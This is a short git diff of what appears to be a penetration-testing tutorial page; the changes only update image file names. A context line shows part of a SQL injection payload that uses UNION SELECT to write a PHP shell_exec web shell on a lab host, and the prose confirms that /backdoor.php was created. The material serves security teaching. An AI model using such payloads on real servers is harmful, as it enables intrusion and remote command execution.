@@ -40,8 +40,8 @@ http://10.11.0.22/debug.php?id=1 union all select 1, 2, "<?php echo shell_exec($
 ```
 {% endcode %}
 
-<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption><p>Command  returns an error</p></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (1).png" alt=""><figcaption><p>Command  returns an error</p></figcaption></figure>
 
 While the command returned an error, that does not necessarily mean that file creation failed. An attempt to navigate to `/backdoor.php` reveals that file creation was in fact successful in this example:
 
-<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption><p>File creation was indeed successful</p></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption><p>File creation was indeed successful</p></figcaption></figure>
